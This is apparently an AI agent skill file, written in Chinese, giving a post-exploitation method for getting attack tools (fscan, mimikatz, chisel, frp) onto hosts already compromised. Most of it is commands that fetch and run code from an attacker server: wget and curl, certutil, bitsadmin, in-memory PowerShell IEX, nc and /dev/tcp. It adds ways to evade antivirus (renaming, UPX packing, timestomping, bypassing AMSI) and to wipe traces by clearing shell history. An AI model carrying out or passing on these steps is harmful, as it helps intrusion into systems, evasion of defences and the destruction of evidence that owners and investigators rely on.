---
name: tool-delivery
description: "向已控目标主机投递工具和文件的方法论。当你已经拿到 shell/webshell/RCE，需要把 fscan、frp、chisel、linpeas、mimikatz 等工具传到目标上执行时使用。覆盖 Linux 和 Windows 全平台文件传输手法（wget/curl/certutil/bitsadmin/PowerShell/python/nc/base64/SMB 等），包括为什么应该在目标机器上而非本地执行工具、如何应对无外网出网、如何绕过杀软检测、执行后痕迹清理。任何涉及'把文件传到目标上'、'在目标上执行扫描工具'、'内网工具投递'、'文件落地'的场景都应使用此技能"
metadata:
  tags: "tool-delivery,文件传输,upload,transfer,投递,落地,wget,curl,certutil,scp,base64,内网,后渗透,file-transfer"
  category: "postexploit"
---

# 工具投递方法论

拿到目标权限后，下一步通常是投递工具（fscan、frp、chisel、linpeas、winPEAS、mimikatz 等）到目标上执行。这个环节看似简单，实际上方法选择直接影响成功率和隐蔽性。

## 投递物仓库 (Arsenal)

预编译好的多平台二进制存放在 `/pentest/arsenal/` 目录（可通过 config.yaml 的 `arsenal_dir` 字段自定义路径），按工具名分子目录，每个子目录包含 linux_amd64、linux_arm64、windows_amd64 三个平台的编译版本：

```bash
ls /pentest/arsenal/
# fscan/  gogo/  zombie/  spray/  cdk/  iox/  frpc/  chisel/

ls /pentest/arsenal/fscan/
# fscan_linux_amd64  fscan_linux_arm64  fscan_windows_amd64.exe
```

投递前根据目标平台选择正确的二进制：
```bash
# 确认目标架构
uname -m   # Linux: x86_64 → amd64, aarch64 → arm64
# Windows: echo %PROCESSOR_ARCHITECTURE%  → AMD64

# 从 arsenal 选择对应版本
python3 -m http.server 8888 --directory /pentest/arsenal/fscan/
```

## 核心原则：为什么在目标上执行

在本地通过代理隧道执行工具 vs 把工具传到目标上直接执行，这不是随意选择：

| 因素 | 本地通过隧道执行 | 目标上直接执行 |
|------|------------------|----------------|
| 网络流量 | 所有扫描流量走隧道，带宽受限 | 流量从目标直接发出，无瓶颈 |
| ICMP | SOCKS5 不支持 ICMP，存活探测失效 | 正常发 ICMP 包，存活探测正常 |
| UDP | SOCKS5 通常不支持 UDP | 正常 UDP 通信 |
| 速度 | 受隧道带宽和延迟双重限制 | 内网直连，毫秒级延迟 |
| 稳定性 | 隧道断开=扫描中断 | 不依赖隧道 |
| 隐蔽性 | 流量模式异常（大量数据过单一隧道） | 更像正常内网通信 |
| 风险 | 无工具落地风险 | 工具二进制可能被 AV 检出 |

**结论：内网扫描/爆破类工具（fscan、nmap、masscan）几乎总是应该传到目标上执行。** 只有轻量级的单次请求（curl 一下、查个 DNS）才适合通过隧道在本地完成。

Linux 下 AV 检测风险通常很低（大多数 Linux 服务器没有 EDR），所以投递风险可以忽略。Windows 下需要更谨慎，见下文杀软应对章节。

## 决策树：选哪种传输方法

```
目标能出网?
├─ 是 → 目标有 wget/curl?
│       ├─ 是 → wget/curl 从攻击机 HTTP 服务下载（最快最简单）
│       └─ 否 → 目标有 python?
│               ├─ 是 → python urllib 下载
│               └─ 否 → 目标是 Linux → /dev/tcp 或 base64 管道
│                        目标是 Windows → certutil / bitsadmin / PowerShell
├─ 否（不出网）→ 有隧道/代理?
│       ├─ 是 → 通过隧道 scp / HTTP 反向下载
│       └─ 否 → 有 webshell?
│               ├─ 是 → webshell 文件上传功能
│               └─ 否 → base64 编码通过 RCE 写入 → 解码
└─ 特殊 → 目标在 K8s Pod / Docker 容器
         → kubectl cp / docker cp
```

## Linux 文件传输

### 方法 1：wget / curl（首选，最常用）

攻击机开 HTTP 服务：
```bash
# 攻击机：在工具目录开 HTTP
cd /path/to/tools
python3 -m http.server 8888
# 或指定绑定地址
python3 -m http.server 8888 --bind 0.0.0.0
```

目标机下载：
```bash
# wget（最常见，几乎所有 Linux 发行版都有）
wget http://ATTACKER:8888/fscan -O /tmp/fscan && chmod +x /tmp/fscan

# curl（macOS 默认只有 curl 没有 wget）
curl http://ATTACKER:8888/fscan -o /tmp/fscan && chmod +x /tmp/fscan

# curl 静默模式
curl -sO http://ATTACKER:8888/fscan && chmod +x fscan
```

### 方法 2：Python 下载

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER:8888/fscan', '/tmp/fscan')"
python2 -c "import urllib; urllib.urlretrieve('http://ATTACKER:8888/fscan', '/tmp/fscan')"
```

### 方法 3：nc（Netcat）传输

不需要 HTTP 服务，适合极简环境：
```bash
# 攻击机（发送端）
nc -lvp 4444 < fscan

# 目标机（接收端）
nc ATTACKER 4444 > /tmp/fscan
chmod +x /tmp/fscan
```

反向模式（目标不能连攻击机，但攻击机能连目标）：
```bash
# 目标机（监听）
nc -lvp 4444 > /tmp/fscan

# 攻击机（连过去发送）
nc TARGET 4444 < fscan
```

### 方法 4：/dev/tcp（Bash 内建，无需任何外部工具）

当目标极简环境（busybox、docker 容器等）没有 wget/curl/nc 时：
```bash
# 攻击机开 nc 监听
nc -lvp 4444 < fscan

# 目标机用 bash 内建接收
cat < /dev/tcp/ATTACKER/4444 > /tmp/fscan
chmod +x /tmp/fscan
```

### 方法 5：base64 编码传输（通过 RCE/webshell 写入）

当目标完全不出网、只能通过漏洞执行命令时的终极方案：
```bash
# 攻击机：编码
base64 -w0 fscan > fscan.b64
# 文件大的话分块
split -b 50000 fscan.b64 chunk_

# 目标机：逐块写入再解码
echo 'BASE64_CHUNK_1' >> /tmp/fscan.b64
echo 'BASE64_CHUNK_2' >> /tmp/fscan.b64
base64 -d /tmp/fscan.b64 > /tmp/fscan
chmod +x /tmp/fscan
md5sum /tmp/fscan  # 校验完整性
```

这个方法慢但万能——只要能执行命令就能传文件。大文件（>1MB）建议分块，避免命令行长度限制。

### 方法 6：SCP / SFTP（有 SSH 凭据时）

```bash
# 从攻击机推送到目标
scp fscan user@TARGET:/tmp/fscan
scp -i id_rsa fscan user@TARGET:/tmp/fscan

# 通过跳板机
scp -o ProxyJump=user@JUMP fscan user@TARGET:/tmp/fscan
```

## Windows 文件传输

### 方法 1：certutil（LOLBin，系统自带）

```cmd
certutil -urlcache -split -f http://ATTACKER:8888/tool.exe C:\Windows\Temp\tool.exe
```
certutil 是证书工具，但可以下载任意文件。杀软可能监控这个命令，但很多环境下仍然有效。

### 方法 2：PowerShell

```powershell
# 下载文件
Invoke-WebRequest -Uri http://ATTACKER:8888/tool.exe -OutFile C:\Windows\Temp\tool.exe

# 简写
iwr http://ATTACKER:8888/tool.exe -o C:\Windows\Temp\tool.exe

# .NET 方式（更底层，有时能绕过策略）
(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8888/tool.exe','C:\Windows\Temp\tool.exe')

# 内存执行（不落地文件，PowerShell 脚本专用）
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER:8888/script.ps1')
```

### 方法 3：bitsadmin（系统自带后台下载）

```cmd
bitsadmin /transfer job /download /priority high http://ATTACKER:8888/tool.exe C:\Windows\Temp\tool.exe
```
BITS 是 Windows Update 用的后台传输服务，比 certutil 更隐蔽。

### 方法 4：SMB 共享（内网传输首选）

```cmd
:: 攻击机开 SMB 共享（用 impacket）
:: python3 smbserver.py share /path/to/tools -smb2support

:: 目标机直接执行（不落地！）
\\ATTACKER\share\tool.exe

:: 或者拷贝过来
copy \\ATTACKER\share\tool.exe C:\Windows\Temp\tool.exe
```
SMB 在内网环境中非常自然，不容易触发告警。

### 方法 5：base64 + PowerShell

```powershell
# 攻击机编码
$bytes = [IO.File]::ReadAllBytes("tool.exe")
[Convert]::ToBase64String($bytes) | Out-File tool.b64

# 目标机解码
$b64 = "BASE64_STRING_HERE"
[IO.File]::WriteAllBytes("C:\Windows\Temp\tool.exe", [Convert]::FromBase64String($b64))
```

### 方法 6：FTP

```cmd
:: 攻击机：python3 -m pyftpdlib -p 21
ftp -s:commands.txt
:: commands.txt 内容：
:: open ATTACKER
:: anonymous
:: binary
:: get tool.exe
:: bye
```

## 杀软应对

### Linux
Linux 服务器很少有 AV/EDR。如果有，考虑：
- 换目录：`/dev/shm/`（内存文件系统，不写磁盘）、`/tmp/`、`/var/tmp/`
- 重命名：别用原始工具名（fscan → 随机名如 `svc_check`）
- 执行后立即删除：`./tool args; rm -f tool`
- memfd 无文件执行（高级）：通过 `/proc/self/fd/` 加载

### Windows
Windows 下 AV 检测更严格，需要更多技巧：
- **换名字**：`mimikatz.exe` → `svc_diag.exe`
- **换目录**：`C:\Windows\Temp\`、`C:\ProgramData\`、用户 Temp 目录
- **UPX 加壳**：`upx -9 tool.exe`，改变文件 hash
- **时间戳伪造**：`timestomp` 修改文件时间
- **SMB 远程执行**（不落地）：`\\share\tool.exe` 直接运行
- **PowerShell 内存加载**：`IEX` 下载字符串直接执行，不写文件
- **AMSI 绕过**：PowerShell 脚本被拦截时需要先绕 AMSI

## 痕迹清理

工具执行完后要清理：
```bash
# Linux
rm -f /tmp/fscan /tmp/result.txt
# 如果在 /dev/shm 执行，重启自动清除
# 清理 bash_history
history -c && unset HISTFILE
# 或精准删除
sed -i '/fscan/d' ~/.bash_history

# Windows
del /f C:\Windows\Temp\tool.exe
del /f C:\Windows\Temp\result.txt
# 清除 PowerShell 历史
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

## 实战流程示例

### 场景：通过 webshell 投递 fscan 做内网扫描

```
Step 1: 攻击机开 HTTP 服务
  python3 -m http.server 8888

Step 2: 通过 webshell 执行下载命令
  wget http://VPS:8888/fscan -O /tmp/.s && chmod +x /tmp/.s

Step 3: 执行扫描
  /tmp/.s -h 10.0.0.0/24 -o /tmp/.r

Step 4: 读取结果
  cat /tmp/.r  （通过 webshell 读取）

Step 5: 清理
  rm -f /tmp/.s /tmp/.r
```

### 场景：不出网环境通过 base64 传工具

```
Step 1: 攻击机编码
  base64 -w0 fscan | head -c 50000   # 确认大小，评估分块数

Step 2: 分块写入（通过 RCE 漏洞）
  echo 'CHUNK1...' > /tmp/.b
  echo 'CHUNK2...' >> /tmp/.b

Step 3: 解码执行
  base64 -d /tmp/.b > /tmp/.s && chmod +x /tmp/.s
  md5sum /tmp/.s  # 校验

Step 4: 执行 + 清理
  /tmp/.s -h 10.0.0.0/24 -o /tmp/.r && rm -f /tmp/.s /tmp/.b
```
